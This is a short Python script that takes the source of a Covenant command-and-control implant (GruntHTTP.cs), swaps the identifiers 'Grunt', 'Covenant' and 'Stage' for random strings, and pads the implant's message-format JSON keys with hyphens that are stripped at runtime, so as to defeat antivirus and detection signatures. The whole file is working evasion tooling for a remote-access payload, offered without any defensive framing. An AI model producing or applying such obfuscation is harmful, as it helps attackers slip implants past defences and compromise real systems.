import argparse
import string
import random

input_file = r"C:\Users\Xadmin\Downloads\Covenant\GruntHTTP.cs"
output_file = r"C:\Users\Xadmin\Downloads\Covenant\obfsGruntHTTP.cs"

try:
    payload = open(input_file).read()
    newfile = open(output_file, "w+")
except IOError:
    print("Input file doesn't exist or can't write to output")
    exit()
letters = string.ascii_lowercase
gruntreplace = ''.join(random.choice(letters) for i in range(5))
covenantreplace = ''.join(random.choice(letters) for i in range(5))
stagereplace = ''.join(random.choice(letters) for i in range(5))

new_stager = payload.replace("Grunt", gruntreplace)
new_stager = new_stager.replace("Covenant", covenantreplace)
new_stager = new_stager.replace("Stage", stagereplace)

msgFormatString='string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";'
newFormatString='string MessageFormat = @"{{""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}}".Replace("-","");'

new_stager = new_stager.replace(msgFormatString, newFormatString)
newfile.write(new_stager)
newfile.close()
print("[+] Done")
